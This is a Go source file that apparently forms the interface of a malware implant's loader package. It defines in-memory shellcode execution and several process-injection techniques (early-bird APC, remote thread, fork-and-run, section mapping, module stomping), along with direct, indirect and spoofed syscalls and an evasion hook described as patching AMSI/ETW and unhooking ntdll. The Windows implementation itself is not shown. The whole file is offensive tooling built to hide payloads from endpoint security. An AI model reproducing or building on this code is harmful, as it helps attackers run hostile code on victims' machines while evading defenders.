// Package loader implements in-memory shellcode / PE execution and remote
// process injection. The Windows build (win_loader.go) uses golang.org/x/sys
// for the allocation/execution primitives; non-Windows builds return explicit
// "unsupported" errors so the agent still compiles everywhere.
package loader

import "fmt"

// CallType selects how the underlying WinAPI primitives are invoked. The full
// direct-vs-indirect matrix (kernel32 forwarder, ntdll stub, direct syscall,
// indirect syscall via ntdll gadget) is wired through CallType on Windows.
// Non-Windows builds ignore the field entirely.
type CallType string

const (
	// CallAPI invokes WinAPI through normal kernel32/kernelbase exports.
	CallAPI CallType = "api"
	// CallSyscall invokes NT syscalls directly via the embedded assembly stubs.
	CallSyscall CallType = "syscall"
	// CallIndirect invokes syscalls through ntdll "syscall; ret" gadgets so the
	// return address and call stack appear to originate inside ntdll.
	CallIndirect CallType = "indirect"
	// CallSpoofed invokes syscalls through a runtime-built 110-byte stub that
	// plants a fake "call rel32; ret" return address inside ntdll before the
	// syscall (L7 call-stack spoofing). Falls back to direct when unavailable.
	CallSpoofed CallType = "spoofed"
)

// InjectMethod selects how shellcode is loaded into a target process.
type InjectMethod string

const (
	// InjectAPC queues an APC on a suspended process (early-bird injection).
	InjectAPC InjectMethod = "apc"
	// InjectRemoteThread creates a thread in the remote process.
	InjectRemoteThread InjectMethod = "remote_thread"
	// InjectForkAndRun spawns a suspended copy of a benign process, injects the
	// payload, runs it, then tears the child down.
	InjectForkAndRun InjectMethod = "fork_and_run"
	// InjectSection maps the shellcode via a shared section (NtCreateSection +
	// NtMapViewOfSection): no VirtualAllocEx / WriteProcessMemory /
	// CreateRemoteThread.
	InjectSection InjectMethod = "section"
	// InjectPhantom (UDRL / module stomping) runs the payload from memory backed
	// by a legitimate System32 DLL image (in-process, CoW pages).
	InjectPhantom InjectMethod = "phantom"
)

// Config controls shellcode execution / injection.
type Config struct {
	// CallType selects the invocation layer (Windows only).
	CallType CallType
	// InjectMethod selects the injection technique.
	InjectMethod InjectMethod
	// Process is the remote process name/path to inject into. When empty,
	// a sensible default (notepad.exe on Windows) is used for remote methods.
	Process string
	// Pid targets a specific remote process (0 = spawn fresh).
	Pid uint32
}

// ApplyEvasion runs the pre-load evasion steps (AMSI/ETW patch, ntdll unhook,
// SSN warm-up) on Windows. On other platforms it is a no-op. It is safe to call
// repeatedly.
func ApplyEvasion() {
	applyEvasion()
}

// Normalize fills defaults so config can never be nil-valued.
func (c *Config) Normalize() Config {
	if c == nil {
		c = &Config{}
	}
	out := *c
	if out.CallType == "" {
		out.CallType = CallAPI
	}
	if out.InjectMethod == "" {
		out.InjectMethod = InjectAPC
	}
	if out.Process == "" {
		out.Process = defaultProcess()
	}
	return out
}

// Result reports what the loader did.
type Result struct {
	Method  string `json:"method"`
	Process string `json:"process,omitempty"`
	PID     uint32 `json:"pid,omitempty"`
	Size    int    `json:"size"`
	Status  string `json:"status"`
	Error   string `json:"error,omitempty"`
	// Address is the base of the mapped/allocated shellcode when available.
	Address uintptr `json:"address,omitempty"`
}

// Exec runs shellcode inside the current process. It never returns until the
// payload terminates; long-running payloads should be dispatched in their own
// goroutine by the caller.
func Exec(shellcode []byte, cfg *Config) (*Result, error) {
	c := cfg.Normalize()
	if len(shellcode) == 0 {
		return nil, fmt.Errorf("empty shellcode")
	}
	return exec(shellcode, c)
}

// Inject runs shellcode in a remote process using the configured technique.
func Inject(shellcode []byte, cfg *Config) (*Result, error) {
	c := cfg.Normalize()
	if len(shellcode) == 0 {
		return nil, fmt.Errorf("empty shellcode")
	}
	return inject(shellcode, c)
}

// Spawn is fork-and-run: spawn a suspended process, inject, run, then reap the
// child. It returns only after the child has been started.
func Spawn(shellcode []byte, cfg *Config) (*Result, error) {
	c := cfg.Normalize()
	if len(shellcode) == 0 {
		return nil, fmt.Errorf("empty shellcode")
	}
	return spawn(shellcode, c)
}
